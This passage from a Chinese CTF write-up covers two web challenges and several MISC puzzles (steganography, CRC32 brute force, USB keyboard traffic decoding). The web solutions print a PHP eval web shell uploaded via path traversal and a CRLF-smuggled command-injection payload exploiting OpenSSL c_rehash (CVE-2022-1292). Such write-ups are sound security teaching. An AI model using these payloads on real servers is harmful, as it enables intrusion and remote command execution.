keyword">case</span> <span class="token string double-quoted-string">"calc"</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\(|\)|\'|\"/im"</span><span class="token punctuation">,</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            <span class="token keyword">return</span> <span class="token string double-quoted-string">"包含非法字符"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">return</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token string double-quoted-string">"admin才能使用这个功能"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string double-quoted-string">"这个动作暂时还没能实现"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"没有匹配到词库消息"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">uploadc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$resourcedir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/resource/"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_dir_exists</span><span class="token punctuation">(</span><span class="token variable">$resourcedir</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$resourcedir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"别这样！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"别这样！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$resourcedir</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"上传成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"上传失败"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">log_write</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$logpath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"log.txt"</span><span class="token punctuation">;</span>    <span class="token variable">$oper</span> <span class="token operator">=</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$opername</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$oper</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$oper</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$opername</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"*"</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$logpath</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$opername</span></span> : <span class="token interpolation"><span class="token variable">$msg</span></span> \n"</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token function">getres</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token function">uploadc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'clear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>题解</li></ul><p>在 uploadc 函数中可以进行文件上传，strpos() 函数的处理可以无视掉</p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">uploadc=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>&amp;cname=../../../../../var/www/html/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>抓包上传</p><p>![[../../../../pic/Pasted image 20220619150711.png|L]]</p><p>使用 AntSword 链接获得 shell</p><p>![[../../../../pic/Pasted image 20220619150747.png|L]]</p><h3 id="5-online-crt"><a href="#5-online-crt" class="headerlink" title="5. online_crt"></a>5. online_crt</h3><p>#OpenSSL #SSRF #c_rehash #CVE-2022-1292</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>题目给出了附件</p><p>审计了一下主要是一个证书的操作</p><p>在 <code>/getcrt</code> 中根据用户信息生成对应的证书</p><p><img src="/../../../../pic/Pasted%20image%2020230227161143.png"></p><p>在 <code>/createlink</code> 中使用 c_rehash 进行处理证书</p><blockquote><p>c_rehash 为文件创建一个符号连接，并将此符号连接的名称设为文件的 hash 值，作用是让 openssl 在证书目录中能够找到证书。</p></blockquote><p>并且题目将改文件直接给了出来，经过搜索发现该文件存在命令注入漏洞</p><p><a href="../../../PenetrationsTest/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OpenSSL/OpenSSL%20c_rehash%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md">OpenSSL c_rehash 命令注入漏洞</a></p><p>找到了漏洞利用点，但是由于证书的名称是随机生成的，所以还需要找个方法修改文件名</p><p>在 <code>/proxy</code> 中可以请求另一个服务，同时在 8887 端口还开放了一个 web 服务，审计一下发现可以在这个服务中进行修改文件名，可以利用 CRLF 构造任意请求</p><p>还需要绕过一个 if 判断</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawPath <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Host <span class="token operator">==</span> <span class="token string">"admin"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230227200839.png"></p><p><img src="/../../../../pic/Pasted%20image%2020230227202638.png"></p><p>这里的 RawPath 查看源代码可知保存的是在进行请求时目标地址被编码过的内容，没有被编码则该值为空，所以这里还需要对请求的内容 URL 编码一下</p><p>由于没有回显所以需要外带构造 payload</p><pre class="line-numbers language-none"><code class="language-none">uri=/admin%252frename?oldname=97dbf242-253c-4a27-a134-a060eb894649.crt%26newname=`echo%2520Y2F0IC8qPjE%253d|base64%2520-d|bash`.crt%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里读取到的为 form 中的内容，所以还需要加一个</p><pre class="line-numbers language-none"><code class="language-none">Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230227202422.png"></p><p>然后访问 <code>/createlink</code> 触发命令注入然后访问 <code>/static/crt/1</code> 下载下来结果</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-pikalang"><a href="#1-pikalang" class="headerlink" title="1. pikalang"></a>1. pikalang</h3><p>丢到 Steglove 中</p><p>![[../../../../pic/Pasted image 20220619160206.png|L]]</p><p>在 Read / Green / Blue 为 0 时均有东西，提取出来获得一个 base64 </p><p>解码后获得一串 Pikachu</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>丢到网站上进行解密即可</p><p><a href="https://www.dcode.fr/pikalang-language">https://www.dcode.fr/pikalang-language</a></p><p>![[../../../../pic/Pasted image 20220620085258.png|L]]</p><h3 id="2-snowberg"><a href="#2-snowberg" class="headerlink" title="2. snowberg"></a>2. snowberg</h3><p>将图片扔到 Stegsolve 中可以发现其中藏着一个压缩包</p><p>![[../../../../pic/Pasted image 20220620085923.png|L]]</p><p>提取出来获得一个压缩包</p><p>![[../../../../pic/Pasted image 20220620090445.png|L]]</p><p>可以看到原始大小为 6，进行 CRC32 爆破攻击</p><p>![[../../../../pic/Pasted image 20220620090803.png|L]]</p><p>最终获得到解压密码 y0u_f0und_th1s_k3y</p><p>获得了一串 Key</p><p>![[../../../../pic/Pasted image 20220620095325.png|L]]</p><p>可能是作为秘钥使用，没有啥东西了继续回去看图片</p><p>一打开图片 010Editor 就开始报错，将报错内容提取出来获得一串密文</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">U2FsdGVkX1+mMxrc0YkGvTaB0c3A9EgFWvjghqa8j+J4vs0SO8q4qXO+OfKOIih+zOwLBe64L23McubUTe1dxA==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220620095219.png|L]]</p><p>丢到 AES 解密获得 flag</p><p>![[../../../../pic/Pasted image 20220620095758.png|L]]</p><h3 id="3-ez-usb"><a href="#3-ez-usb" class="headerlink" title="3. ez_usb"></a>3. ez_usb</h3><p>#流量分析 #USB协议 #键盘流量</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>查看下流量可知存在两个版本的流量，分别导出来</p><pre class="line-numbers language-none"><code class="language-none">tshark -r ./ez_usb.pcapng -Y 'usb.data_len == 8' -Y 'usb.src =="2.8.1"' -T fields -e usbhid.data &gt; 1.txttshark -r ./ez_usb.pcapng -Y 'usb.data_len == 8' -Y 'usb.src =="2.8.1"' -T fields -e usbhid.data &gt; 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用脚本处理一下获取传输内容</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"bufio"</span>      <span class="token string">"fmt"</span>      <span class="token string">"io"</span>      <span class="token string">"log"</span>      <span class="token string">"os"</span>      <span class="token string">"strings"</span>      <span class="token string">"syscall"</span><span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     input<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> input<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>       normalKeys <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span>     shiftKeys <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token 